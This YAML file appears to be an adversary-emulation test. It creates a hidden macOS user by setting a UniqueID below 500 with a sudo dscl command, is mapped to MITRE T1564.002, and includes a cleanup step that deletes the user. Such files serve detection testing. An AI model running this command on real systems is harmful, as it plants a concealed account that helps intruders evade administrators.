api_version: "2.0"
name: Create Hidden User using UniqueID < 500
description: |
    Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)
args:
    - name: user_name
      type: string
      default: APT
uuid: 4238a7f0-a980-4fff-98a2-dfc0a363d507
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1564: Hide Artifacts'
    subtechniques:
        - 'T1564.002: Hidden Users'
requirements:
    platforms:
        - os: macos
steps:
    - name: create-hidden-user-using-uniqueid-<-500
      inline: |
        sudo dscl . -create /Users/{{.Args.user_name}} UniqueID 333
      executor: sh
      cleanup:
        inline: |
            sudo dscl . -delete /Users/{{.Args.user_name}}
        executor: sh
